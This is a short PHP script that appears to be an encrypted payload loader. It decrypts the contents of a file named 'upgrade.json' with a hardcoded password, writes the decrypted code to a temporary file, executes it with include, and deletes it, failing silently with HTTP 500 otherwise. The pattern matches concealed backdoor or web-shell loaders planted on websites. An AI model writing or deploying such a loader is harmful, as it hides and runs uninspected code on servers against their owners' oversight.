<?php
$password = "5555555555577777777777577777775777777777@@@33333445";
$encFile = __DIR__ . '/upgrade.json';
if (!file_exists($encFile)) { http_response_code(500); die(); }
$data = json_decode(file_get_contents($encFile), true);
if (!$data || !isset($data['salt'], $data['iv'], $data['ciphertext'], $data['hmac'])) { http_response_code(500); die(); }
$salt = hex2bin($data['salt']);
$iv = hex2bin($data['iv']);
$ciphertext = hex2bin($data['ciphertext']);
$tag = hex2bin($data['hmac']);
$key = hash_pbkdf2('sha512', $password, $salt, 100000, 32, true);
if (!hash_equals(hash_hmac('sha256', $iv . $ciphertext, $key, true), $tag)) { http_response_code(500); die(); }
$decrypted = openssl_decrypt($ciphertext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
if ($decrypted === false) { http_response_code(500); die(); }
$tmpfname = tempnam(sys_get_temp_dir(), 'decphp');
file_put_contents($tmpfname, $decrypted);
include $tmpfname;
unlink($tmpfname);
